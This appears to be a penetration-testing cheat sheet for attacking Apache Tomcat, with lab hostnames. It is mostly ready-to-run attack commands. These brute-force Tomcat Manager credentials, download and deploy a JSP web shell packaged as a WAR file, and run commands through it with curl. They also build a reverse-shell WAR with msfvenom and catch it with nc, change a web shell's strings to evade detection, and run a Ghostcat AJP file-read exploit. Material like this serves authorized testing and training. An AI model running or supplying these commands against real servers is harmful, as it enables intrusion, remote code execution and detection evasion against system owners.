If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution.

## Tomcat Manager - Login Brute Forcing

**Msfconsole
```
sudo msfconsole
use scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.201.58
show options
run
```

**Python script
https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
```
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```


## Tomcat Manager - WAR File Upload

1. Enter credentials at http://web01.inlanefreight.local:8180/manager/html
2. Upload this JSP web shell: https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 
```
3. Click deploy
4. Browse to /backups and it should be in there
```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```
5. Delete WAR file by undeploying once done and report the location of the upload (/opt/tomcat/apache-tomcat-10.0.10/webapps)

**Msfvenom to Generate WAR File
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
nc -lnvp 4443
```

**Msfconsole module
https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/

**Lightweight JSP web shell to evade detection
https://github.com/SecurityRiskAdvisors/cmd.jsp
Change this to evade:
```java
FileOutputStream(f);stream.write(m);o="Uploaded:
```
```java
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```


## CVE-2020-1983: Ghostcat
https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
```
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
```
- Can only read files in current directory
